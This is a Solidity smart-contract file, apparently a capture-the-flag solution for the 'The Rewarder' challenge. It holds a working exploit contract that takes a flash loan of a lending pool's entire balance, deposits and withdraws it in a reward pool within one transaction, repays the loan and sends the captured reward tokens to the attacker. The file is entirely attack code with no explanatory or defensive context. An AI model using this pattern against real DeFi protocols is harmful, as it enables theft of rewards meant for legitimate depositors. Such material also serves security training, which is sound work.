// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IFlashLoanerPool {
    function liquidityToken() external returns (IERC20);
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function rewardToken() external returns (IERC20);
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}


contract TheRewarderAttack {
    
    ITheRewarderPool private immutable rewarderPool;
    address private immutable attacker;
    
    constructor(address theRewarderPool) {
        rewarderPool = ITheRewarderPool(theRewarderPool);
        attacker = msg.sender;
    }

    function attack(address flashLoanerPool) external {
        IFlashLoanerPool pool = IFlashLoanerPool(flashLoanerPool);
        uint256 poolBalance = pool.liquidityToken().balanceOf(flashLoanerPool);
        pool.flashLoan(poolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        IERC20 liquidityToken = IFlashLoanerPool(msg.sender).liquidityToken();
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
        
        IERC20 rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
